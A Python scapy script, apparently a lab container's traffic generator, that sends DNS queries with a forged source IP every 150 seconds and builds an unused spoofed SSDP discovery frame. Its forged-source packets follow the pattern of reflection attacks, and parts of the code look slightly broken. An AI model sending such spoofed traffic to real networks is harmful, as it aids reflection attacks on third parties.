#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from scapy.all import send, IP, TCP, Ether, sendp, UDP, DNSQR, DNS, RandShort
from time import sleep
from os import environ
from fcntl import ioctl
from socket import socket,AF_INET,SOCK_DGRAM
from struct import pack


def getHwAddr(ifname):
    s = socket(AF_INET, SOCK_DGRAM)
    info = ioctl(
        s.fileno(), 0x8927, pack("256s", bytes(ifname, "utf-8")[:15])
    )
    return ":".join("%02x" % b for b in info[18:24])


# hostip = environ["HOST_IP"]
# destip = environ["DEST_IP"]
fake_mac = getHwAddr("eth0")
spoofedIPsrc = environ["HOST_IP"]
SSDPserver = environ["DEST_IP"]

payload = f"""
M-SEARCH * HTTP/1.1\r\n
HOST:{SSDPserver}:1900\r\n
ST:upnp:rootdevice\r\n
MAN: \"ssdp:discover\"\r\n
MX:2\r\n\r\n"""

print("Container started")

while True:
    ans = IP(dst=SSDPserver,src=spoofedIPsrc)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com",qtype="A"))
    ssdpRequest = (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=spoofedIPsrc, dst=SSDPserver)
        / UDP(sport=1900, dport=1900)
        / payload
    )
    print("Sent from", spoofedIPsrc, "to", SSDPserver, "ethernet address", fake_mac, "sleep 2.5 mins")
    sendp(ans)
    sleep(150)

# while True:
#     send(IP(src=hostip, dst=destip) / TCP(dport=80, flags="S"))
#     print("Sent from", hostip, "to", destip, "sleep 2.5 mins")
#     sleep(150)
